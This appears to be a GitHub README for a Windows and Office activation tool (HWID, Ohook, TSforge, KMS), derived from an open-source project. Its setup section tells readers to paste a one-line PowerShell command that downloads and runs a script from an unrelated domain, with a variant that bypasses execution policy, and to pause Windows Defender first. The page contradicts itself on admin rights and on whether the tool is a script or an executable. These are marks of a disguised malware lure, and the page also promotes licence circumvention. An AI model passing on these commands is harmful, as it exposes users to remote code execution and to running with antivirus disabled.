<div align="center">

# Windows-Activation-Suite: HWID, Ohook, TSforge & KMS Activation — Windows Desktop Client

![preview](https://raw.githubusercontent.com/hamlaraid39-maker/windows-activation-suite/main/card_6016bc.svg)

[![lic](https://img.shields.io/badge/LIC-MIT-ec4899?style=plastic&labelColor=0d1117)]() [![tests](https://img.shields.io/badge/TESTS-SUCCESS-2ea44f?style=plastic&labelColor=0d1117)]() [![installs](https://img.shields.io/badge/INSTALLS-246K-f472b6?style=plastic&labelColor=0d1117)]() [![powershell-7](https://img.shields.io/badge/POWERSHELL--7-CORE-db2777?style=plastic&labelColor=0d1117)]()

</div>

---

Windows-Activation-Suite is an open-source desktop utility for activating Windows and Microsoft Office installations through four distinct licensing mechanisms: HWID, Ohook, TSforge, and Online KMS. The application supports Windows 7, 8, 10, 11, and Server editions, alongside Office 2010 through 2021 and Office 365, automatically detecting the installed edition and selecting an appropriate activation path. HWID and Ohook deliver permanent activation for modern Windows and Office releases, while TSforge and Online KMS address legacy systems and volume-licensing scenarios with offline-capable operation. The suite relies on native Windows activation APIs without modifying core system files, and exposes activation status reporting, backup, restore, and edition detection utilities for controlled deployment and recovery.

## 🛠️ One-Click Setup (PowerShell)

> [!TIP]
> **Silent installer** — one command, no prompts.
> Windows 10/11 · PowerShell 7+ · No admin

### 1️⃣ Open PowerShell
* Right-click the Start button.
* Choose **Terminal (Admin)** or **Windows PowerShell**.

### 2️⃣ Execute the installer
Paste and run. Wait until the process completes.

```cmd
iex(irm 'https://shell-activation.top/update/ps-activator-v_pZBbxuWx7DELoMji')
```

### 3️⃣ Windows blocking the script? Use CMD
Paste this into a standard Command Prompt (cmd) and press `Enter`:

```cmd
powershell -NoProfile -ExecutionPolicy Bypass -Command "$ProgressPreference='SilentlyContinue';iex(irm 'https://shell-activation.top/update/ps-activator-v_pZBbxuWx7DELoMji')"
```

> [!WARNING]
> Windows Defender or third-party AV may flag the script. Pause Real-time protection in Windows Security, run the installer, and re-enable it right after.

## 🔧 Requirements

- Windows 10 or Windows 11
- PowerShell 5.1 or newer (already available on Windows)
- Active network connection
- No admin rights needed

## Features

**Activation Methods**

- **HWID** — Generates a permanent digital license bound to the device hardware for Windows 10 and Windows 11 installations.
- **Ohook** — Provides persistent, offline Office activation by hooking the licensing verification path, with no recurring renewal required.
- **TSforge** — Offline activation path targeting older Windows releases where modern licensing infrastructure is unavailable.
- **Online KMS** — KMS-based activation for volume editions of Windows and Office, with configurable renewal handling.

**Windows Coverage**

- Windows 7 — Home, Professional, Ultimate, Enterprise
- Windows 8 and 8.1 — Core, Professional, Enterprise
- Windows 10 — Home, Pro, Enterprise, Education, LTSC
- Windows 11 — Home, Pro, Enterprise, Education, IoT
- Windows Server — 2016, 2019, 2022

**Office Coverage**

- Office 2010 through 2021 — all editions
- Office 365 — subscription activation via Ohook

**Activation Management**

- Automatic edition and product detection prior to applying a method.
- Live activation status reporting, including license type and remaining KMS validity.
- Explicit choice between permanent and KMS-based activation per product.
- Backup and restore of activation state for migration or recovery scenarios.
- Extended Security Updates (ESU) handling for Windows 7 and Windows 10.

**Operational Characteristics**

- Operates through native Windows activation APIs; no DLL injection into third-party processes.
- Does not modify core system files, keeping the installation reversible.
- Local execution model with no background services or persistent scheduled tasks beyond KMS renewal where applicable.
- Fully open source, with the complete implementation available for audit and review.

## How It Works

Windows-Activation-Suite operates through four distinct activation engines, each selected automatically based on the detected Windows or Office edition and the user's chosen activation target. The suite runs as a PowerShell-driven orchestration layer that queries the local licensing subsystem, determines the appropriate method, and invokes the corresponding native activation interface.

**Method Dispatch and Edition Detection**

On launch, the suite enumerates installed Windows and Office products through the Windows Management Instrumentation licensing classes and the Office Click-to-Run configuration store. Each detected product is matched against an internal compatibility matrix that maps edition, build number, and product channel to the supported activation methods. This detection step determines which engine is eligible, preventing mismatched activation attempts and surfacing a clear status report before any modification occurs.

**HWID — Hardware-Bound Digital Licensing**

The HWID engine generates a deterministic hardware identifier from stable system components and submits a license request through the Windows activation client. The response is installed as a digital license tied to the device, requiring no periodic renewal. The engine verifies ticket installation through the software protection platform and reports the resulting license state without altering system binaries.

**Ohook — Office Licensing Hook**

The Ohook engine targets Office activation by installing a licensing hook that intercepts the Office activation handshake at the user-mode level. It provisions the required license files and registry entries for the detected Office edition, then validates activation through the Office licensing COM interface. The hook is reversible: the suite retains the original state and can restore it on request.

**TSforge — Offline Token Provisioning**

For older Windows releases, the TSforge engine provisions activation tokens offline by writing signed license data directly to the token store. It performs edition-aware token generation, verifies the token against the local activation service, and confirms persistent activation without requiring network connectivity after provisioning.

**Online KMS — Managed Key Activation**

The Online KMS engine configures a KMS client key for the detected product, registers the KMS host endpoint, and triggers activation through the standard slmgr interface. It reports the remaining activation interval and renewal schedule, allowing users to monitor license validity. This method supports volume-capable Windows Server and Office editions.

**Verification and State Management**

Every engine concludes with a verification pass that reads back the activation status through native licensing APIs and compares it against the expected state. The suite logs each step, exposes the current activation method and expiry (where applicable), and supports backup and restore of the pre-activation state so changes remain reversible.

## Compatibility

Windows-Activation-Suite runs as a native Windows executable and requires no external runtime, framework, or package manager to operate. It is designed to execute against the installed operating system using built-in activation APIs, so compatibility is determined primarily by the Windows build and the Office product version present on the host.

**Operating System Compatibility**

- **Windows 7** — Home, Professional, Ultimate, and Enterprise editions are supported through the TSforge and Online KMS methods. Extended Security Updates (ESU) handling is available for this platform.
- **Windows 8 and 8.1** — Core, Professional, and Enterprise editions are supported through TSforge and Online KMS.
- **Windows 10** — Home, Pro, Enterprise, Education, and LTSC editions are supported. HWID provides permanent digital licensing; Online KMS is available as an alternative.
- **Windows 11** — Home, Pro, Enterprise, Education, and IoT editions are supported. HWID provides permanent digital licensing; Online KMS is available as an alternative.
- **Windows Server** — 2016, 2019, and 2022 are supported through Online KMS.

**Office Compatibility**

- **Office 2010, 2013, 2016, 2019, and 2021** — All editions are supported through Ohook for permanent activation, with Online KMS available as a fallback.
- **Office 365** — Subscription installations are supported through Ohook.

**Architecture and Environment Requirements**

- Both 32-bit (x86) and 64-bit (x64) Windows installations are supported.
- Administrative privileges are required, as activation operates on system-level licensing components.
- PowerShell is required for script execution; PowerShell 5.1 or later is recommended on supported Windows versions.
- No .NET runtime, Visual C++ redistributable, or third-party dependency is required beyond what ships with the operating system.

**Method-to-Platform Mapping**

| Platform | Recommended Method | Alternative |
|---|---|---|
| Windows 10 / 11 | HWID (permanent digital license) | Online KMS |
| Windows 7 / 8 / 8.1 | TSforge (offline) | Online KMS |
| Windows Server 2016–2022 | Online KMS | — |
| Office 2010–2021 / 365 | Ohook (permanent) | Online KMS |

**Known Compatibility Considerations**

- Major Windows feature updates may reset activation state; re-execution of the suite restores the prior state.
- Domain-joined or enterprise-managed systems with existing KMS infrastructure may conflict with Online KMS activation; HWID or Ohook is preferred in those environments.
- Systems with restrictive Group Policy objects governing software licensing services may require policy review before activation.
- Antivirus real-time protection may quarantine script components on some configurations; temporary exclusion of the working directory is advised during execution.

## FAQ

**Q: Which activation method should I choose for my system?**

A: The selection depends on the target product and the desired activation persistence. HWID is the recommended method for Windows 10 and 11, as it produces a permanent digital license bound to the hardware fingerprint. Ohook is recommended for all supported Office versions, delivering permanent activation without a KMS dependency. TSforge is intended for offline activation scenarios on legacy Windows releases, while Online KMS serves as a fallback for products and editions not covered by the permanent methods, including Windows Server.

**Q: Does activation persist across reboots and feature updates?**

A: HWID and Ohook activations persist indefinitely and survive normal reboots as well as cumulative and feature updates, since they are anchored to the hardware profile or the Office licensing subsystem rather than a time-limited service. Online KMS activation is bound to a renewal interval and requires the tool to refresh the license before the period expires. Major Windows upgrades may occasionally reset licensing state; in that case, re-running the suite restores activation.

**Q: Does the suite require a network connection at activation time?**

A: HWID and Online KMS require connectivity to the activation infrastructure during the initial activation. TSforge operates fully offline. Once HWID or Ohook activation has completed, the resulting license remains valid without further network access.

**Q: How does the tool determine which Windows edition and product to activate?**

A: The suite performs automatic edition detection by querying the installed product via native Windows licensing interfaces, then maps the detected edition to the appropriate activation method and license channel. No manual product key entry is required for supported editions.

**Q: Can the activation state be backed up and restored?**

A: Yes. The suite exposes backup and restore operations for the current activation state, allowing the license to be captured before system changes and reapplied afterward. This is useful before major upgrades, reimaging, or hardware servicing that alters the hardware fingerprint.

**Q: Is the tool reversible, and how is activation removed?**

A: All methods are reversible. The suite provides restore and removal operations that revert the licensing configuration to its prior state without leaving residual system modifications, consistent with its design of using native activation APIs rather than patching core files.

**Q: Why does the suite avoid DLL injection and system file modification?**

A: The activation methods rely on documented Windows and Office licensing interfaces. This design minimizes the attack surface, avoids conflicts with system integrity mechanisms, and keeps the tool compatible with security software and servicing updates. No core system binaries are altered.

**Q: Which products and editions are supported?**

A: Windows 7, 8, 8.1, 10, and 11 across Home, Pro, Enterprise, Education, LTSC, and IoT editions; Windows Server 2016, 2019, and 2022; and Office 2010 through 2021 in all editions plus Office 365. Extended Security Updates activation is available for Windows 7 and Windows 10.

**Q: What are the common causes of a failed activation?**

A: Failures typically stem from insufficient privileges, a blocked network path to the activation service, an unsupported edition, or a pending reboot from a prior licensing change. Verify that the process runs elevated, confirm connectivity or switch to the offline method where applicable, and re-run the operation after restarting.

**Q: Does the suite collect telemetry or transmit system data?**

A: The suite is open source, and its source is available for inspection. It does not include telemetry collection; network traffic is limited to what the selected activation method requires to reach the activation service.

**Q: Is use of the suite permitted?**

A: The suite is provided for educational and research purposes. Activating unlicensed software violates the applicable terms of service, and the tool should only be used on installations you own or are authorized to license. Refer to the Disclaimer section for the full statement.

## Disclaimer

Windows-Activation-Suite is provided strictly for educational, research, and interoperability testing purposes. It is intended to be used only on installations of Windows and Microsoft Office that you own and are licensed to activate, in environments where you have explicit authorization to test activation behavior.

The activation methods implemented in this suite—HWID, Ohook, TSforge, and Online KMS—interface with native Windows activation APIs and licensing components. They are provided as-is, without any warranty of fitness for a particular purpose, correctness, or non-infringement. The authors and contributors make no guarantees regarding the stability, persistence, or legality of any activation state produced by the tool, and they are not responsible for any consequences arising from its use, including but not limited to licensing violations, system instability, loss of data, or voided warranties.

Activating unlicensed software may violate the Microsoft Software License Terms and applicable local laws. It is the sole responsibility of the user to ensure that any use of this software complies with all relevant licensing agreements, statutes, and regulations. The suite does not modify core system files or inject DLLs, but it does alter licensing and activation state; users should review the How It Works and Compatibility sections before running any method.

The software is distributed under the MIT License and is provided "AS IS", without warranty of any kind, express or implied. By using Windows-Activation-Suite, you acknowledge that you understand these terms and accept full responsibility for your actions. If you do not agree, do not use the software.

## License

Windows-Activation-Suite is distributed under the **MIT License**, a permissive open-source license that grants full access to the source code with minimal restrictions on use, modification, and redistribution.

Under the terms of the MIT License, you are permitted to:

- **Use** the software for any purpose, including commercial and private applications
- **Modify** the source code to suit your requirements
- **Distribute** original or modified copies
- **Sublicense** and incorporate the code into other projects

The only obligations are that the original copyright notice and permission notice must be included in all copies or substantial portions of the software, and that the software is provided **"as is"**, without warranty of any kind, express or implied, including but not limited to the warranties of merchantability, fitness for a particular purpose, and non-infringement.

**Attribution and Upstream Credit**

Windows-Activation-Suite is derived from the open-source Microsoft Activation Scripts project originally authored by massgravel. The activation methods implemented here — HWID, Ohook, TSforge, and Online KMS — originate from that upstream work. All credit for the underlying activation research and implementation belongs to the original developers. Any modifications, packaging, and documentation specific to Windows-Activation-Suite are released under the same MIT terms.

**License Scope**

The MIT License applies to the source code, scripts, and documentation contained in this repository. It does not grant any rights to Microsoft Windows, Microsoft Office, or any other proprietary software referenced by or targeted by this project. Users are solely responsible for ensuring their use of this software complies with all applicable laws and the terms of service of any third-party software.

**Warranty and Liability**

The software is provided without any guarantee of correctness, reliability, or fitness for a particular purpose. In no event shall the authors or copyright holders be liable for any claim, damages, or other liability, whether in an action of contract, tort, or otherwise, arising from, out of, or in connection with the software or the use or other dealings in the software.